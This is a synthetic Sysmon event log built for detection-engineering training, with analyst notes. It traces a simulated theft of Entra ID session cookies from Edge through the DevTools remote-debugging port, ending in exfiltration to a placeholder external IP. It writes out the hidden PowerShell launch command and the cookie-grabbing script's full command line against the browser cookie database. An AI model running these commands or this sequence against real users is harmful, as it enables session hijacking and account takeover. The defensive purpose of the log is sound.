{
  "log_source": "Sysmon",
  "host": "CORP-FIN-WK17",
  "domain": "CONTOSO",
  "primary_user": "CONTOSO\\schen",
  "note": "Synthetic sample data for training/detection-engineering purposes. Not from a real incident.",
  "events": [
    {
      "EventID": 1,
      "EventDescription": "ProcessCreate",
      "TimeCreated": "2026-07-18T13:05:12.401Z",
      "Computer": "CORP-FIN-WK17.contoso.com",
      "EventData": {
        "UtcTime": "2026-07-18 13:05:12.401",
        "ProcessGuid": "{4f21a6e3-0c9a-668a-0100-000000000101}",
        "ProcessId": 5112,
        "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "FileVersion": "126.0.2592.87",
        "Description": "Microsoft Edge",
        "Product": "Microsoft Edge",
        "Company": "Microsoft Corporation",
        "OriginalFileName": "msedge.exe",
        "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
        "CurrentDirectory": "C:\\Users\\schen\\",
        "User": "CONTOSO\\schen",
        "LogonGuid": "{4f21a6e3-0b10-668a-0000-002000e3a301}",
        "LogonId": "0x1e3a300",
        "TerminalSessionId": 2,
        "IntegrityLevel": "Medium",
        "Hashes": "SHA256=8A1F0C6E2B7D4E9C5A3F6B1D0E4C7A9F2B5D8E1C4A7F0B3D6E9C2A5F8B1D4E7C",
        "ParentProcessGuid": "{4f21a6e3-0b12-668a-0000-002000d29e00}",
        "ParentProcessId": 4288,
        "ParentImage": "C:\\Windows\\explorer.exe",
        "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
        "ParentUser": "CONTOSO\\schen",
        "AnalystNote": "Baseline / normal daily browser launch for comparison - no debugging flags, parent is explorer.exe (interactive user launch)."
      }
    },
    {
      "EventID": 1,
      "EventDescription": "ProcessCreate",
      "TimeCreated": "2026-07-18T14:29:41.203Z",
      "Computer": "CORP-FIN-WK17.contoso.com",
      "EventData": {
        "UtcTime": "2026-07-18 14:29:41.203",
        "ProcessGuid": "{4f21a6e3-0d55-668a-0200-000000000102}",
        "ProcessId": 9364,
        "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "FileVersion": "126.0.2592.87",
        "Description": "Microsoft Edge",
        "Product": "Microsoft Edge",
        "Company": "Microsoft Corporation",
        "OriginalFileName": "msedge.exe",
        "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --remote-debugging-port=9222 --user-data-dir=\"C:\\Users\\schen\\AppData\\Local\\Temp\\edg_prof\" --headless=new --disable-gpu --no-first-run",
        "CurrentDirectory": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
        "User": "CONTOSO\\schen",
        "LogonGuid": "{4f21a6e3-0b10-668a-0000-002000e3a301}",
        "LogonId": "0x1e3a300",
        "TerminalSessionId": 2,
        "IntegrityLevel": "Medium",
        "Hashes": "SHA256=8A1F0C6E2B7D4E9C5A3F6B1D0E4C7A9F2B5D8E1C4A7F0B3D6E9C2A5F8B1D4E7C",
        "ParentProcessGuid": "{4f21a6e3-0d55-668a-0200-000000000099}",
        "ParentProcessId": 7716,
        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ParentCommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe' -ArgumentList '--remote-debugging-port=9222 --user-data-dir=C:\\Users\\schen\\AppData\\Local\\Temp\\edg_prof --headless=new --disable-gpu --no-first-run'\"",
        "ParentUser": "CONTOSO\\schen",
        "AnalystNote": "SUSPICIOUS: browser relaunched with --remote-debugging-port, spawned from a hidden PowerShell window rather than explorer.exe/user interaction. Enables Chrome DevTools Protocol (CDP) access to the browser session."
      }
    },
    {
      "EventID": 3,
      "EventDescription": "NetworkConnect",
      "TimeCreated": "2026-07-18T14:29:50.115Z",
      "Computer": "CORP-FIN-WK17.contoso.com",
      "EventData": {
        "UtcTime": "2026-07-18 14:29:50.115",
        "ProcessGuid": "{4f21a6e3-0d5a-668a-0300-000000000103}",
        "ProcessId": 8840,
        "Image": "C:\\Users\\schen\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
        "User": "CONTOSO\\schen",
        "Protocol": "tcp",
        "Initiated": "true",
        "SourceIsIpv6": "false",
        "SourceIp": "127.0.0.1",
        "SourceHostname": "CORP-FIN-WK17.contoso.com",
        "SourcePort": 51422,
        "SourcePortName": "",
        "DestinationIsIpv6": "false",
        "DestinationIp": "127.0.0.1",
        "DestinationHostname": "localhost",
        "DestinationPort": 9222,
        "DestinationPortName": "",
        "AnalystNote": "python.exe connects to the local CDP debugging endpoint opened by msedge.exe (port 9222)."
      }
    },
    {
      "EventID": 1,
      "EventDescription": "ProcessCreate",
      "TimeCreated": "2026-07-18T14:29:50.560Z",
      "Computer": "CORP-FIN-WK17.contoso.com",
      "EventData": {
        "UtcTime": "2026-07-18 14:29:50.560",
        "ProcessGuid": "{4f21a6e3-0d5a-668a-0300-000000000103}",
        "ProcessId": 8840,
        "Image": "C:\\Users\\schen\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
        "FileVersion": "3.12.4150.0",
        "Description": "Python",
        "Product": "Python",
        "Company": "Python Software Foundation",
        "OriginalFileName": "python.exe",
        "CommandLine": "python.exe C:\\Users\\schen\\AppData\\Local\\Temp\\cdp_cookie_grab.py --cdp-port 9222 --target-host login.microsoftonline.com --cookie-db \"C:\\Users\\schen\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies\" --out C:\\Users\\schen\\AppData\\Local\\Temp\\session_dump.json",
        "CurrentDirectory": "C:\\Users\\schen\\AppData\\Local\\Temp\\",
        "User": "CONTOSO\\schen",
        "LogonGuid": "{4f21a6e3-0b10-668a-0000-002000e3a301}",
        "LogonId": "0x1e3a300",
        "TerminalSessionId": 2,
        "IntegrityLevel": "Medium",
        "Hashes": "SHA256=1B4E7F2A9C6D3E0B5A8F1C4D7E0B3A6F9C2D5E8B1A4F7C0D3E6B9A2F5C8D1E4B",
        "ParentProcessGuid": "{4f21a6e3-0d55-668a-0200-000000000099}",
        "ParentProcessId": 7716,
        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ParentCommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"...\"",
        "ParentUser": "CONTOSO\\schen",
        "AnalystNote": "SUSPICIOUS: script command line directly references the Edge cookie database path (Network\\Cookies) and targets login.microsoftonline.com - the domain Entra ID/Azure AD sets its SSO session cookies (e.g. ESTSAUTH, ESTSAUTHPERSISTENT) on."
      }
    },
    {
      "EventID": 11,
      "EventDescription": "FileCreate",
      "TimeCreated": "2026-07-18T14:29:51.002Z",
      "Computer": "CORP-FIN-WK17.contoso.com",
      "EventData": {
        "UtcTime": "2026-07-18 14:29:51.002",
        "ProcessGuid": "{4f21a6e3-0d5a-668a-0300-000000000103}",
        "ProcessId": 8840,
        "Image": "C:\\Users\\schen\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
        "TargetFilename": "C:\\Users\\schen\\AppData\\Local\\Temp\\cookies_bak.db",
        "CreationUtcTime": "2026-07-18 14:29:51.002",
        "User": "CONTOSO\\schen",
        "AnalystNote": "Live copy of the locked Edge 'Cookies' SQLite database made to a Temp path so it can be opened/read while the browser process still holds a lock on the original file."
      }
    },
    {
      "EventID": 11,
      "EventDescription": "FileCreate",
      "TimeCreated": "2026-07-18T14:29:52.884Z",
      "Computer": "CORP-FIN-WK17.contoso.com",
      "EventData": {
        "UtcTime": "2026-07-18 14:29:52.884",
        "ProcessGuid": "{4f21a6e3-0d5a-668a-0300-000000000103}",
        "ProcessId": 8840,
        "Image": "C:\\Users\\schen\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
        "TargetFilename": "C:\\Users\\schen\\AppData\\Local\\Temp\\session_dump.json",
        "CreationUtcTime": "2026-07-18 14:29:52.884",
        "User": "CONTOSO\\schen",
        "AnalystNote": "Staging file for DPAPI-decrypted cookie values pulled from cookies_bak.db, including the login.microsoftonline.com session cookies ESTSAUTH and ESTSAUTHPERSISTENT. Sysmon does not capture file contents; this note reflects follow-up host forensics/EDR file-read telemetry, not a raw Sysmon field."
      }
    },
    {
      "EventID": 3,
      "EventDescription": "NetworkConnect",
      "TimeCreated": "2026-07-18T14:29:55.240Z",
      "Computer": "CORP-FIN-WK17.contoso.com",
      "EventData": {
        "UtcTime": "2026-07-18 14:29:55.240",
        "ProcessGuid": "{4f21a6e3-0d5a-668a-0300-000000000103}",
        "ProcessId": 8840,
        "Image": "C:\\Users\\schen\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
        "User": "CONTOSO\\schen",
        "Protocol": "tcp",
        "Initiated": "true",
        "SourceIsIpv6": "false",
        "SourceIp": "10.20.4.117",
        "SourceHostname": "CORP-FIN-WK17.contoso.com",
        "SourcePort": 51501,
        "SourcePortName": "",
        "DestinationIsIpv6": "false",
        "DestinationIp": "203.0.113.77",
        "DestinationHostname": "",
        "DestinationPort": 443,
        "DestinationPortName": "https",
        "AnalystNote": "Exfiltration of session_dump.json to external IP 203.0.113.77 over HTTPS. Pivot: this same IP is later seen as the source of an anomalous Azure AD sign-in for the same user (see logs/cloud/azuread_signin_logs.json)."
      }
    },
    {
      "EventID": 5,
      "EventDescription": "ProcessTerminate",
      "TimeCreated": "2026-07-18T14:30:12.611Z",
      "Computer": "CORP-FIN-WK17.contoso.com",
      "EventData": {
        "UtcTime": "2026-07-18 14:30:12.611",
        "ProcessGuid": "{4f21a6e3-0d5a-668a-0300-000000000103}",
        "ProcessId": 8840,
        "Image": "C:\\Users\\schen\\AppData\\Local\\Programs\\Python\\Python312\\python.exe",
        "User": "CONTOSO\\schen",
        "AnalystNote": "Cookie-theft script exits after exfiltration. The headless msedge.exe (PID 9364) and staging files under Temp remain on disk and are available for forensic recovery."
      }
    }
  ]
}
